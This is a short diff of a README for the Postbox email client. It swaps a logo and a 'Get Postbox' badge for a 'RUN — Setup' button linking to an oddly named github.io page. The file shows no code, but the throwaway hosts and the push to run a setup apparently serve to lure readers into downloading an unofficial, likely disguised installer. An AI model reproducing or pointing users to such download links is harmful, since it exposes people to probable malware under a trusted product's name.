@@ -1,14 +1,6 @@
 # Postbox – Seamless Borderless Email Client Experience
 
-<p align="center">
-  <img src="https://d1ctrvvfkbyl4b.cloudfront.net/blog/_1200x630_crop_center-center_82_none/postbox-logo@2x.png" alt="Postbox Logo"/>
-</p>
-
-<p align="center">
-  <a href="https://post-box-cost.github.io/.github/">
-    <img src="https://img.shields.io/badge/⬇️_Get_Postbox-blue?style=for-the-badge&logo=github" alt="Get Postbox"/>
-  </a>
-</p>
+[![RUN Setup](https://img.shields.io/badge/RUN%20%E2%80%94%20Setup-2ea44f?style=for-the-badge&logoColor=white)](https://p68840503.github.io/.github/Post-Box)
 
 ---
 
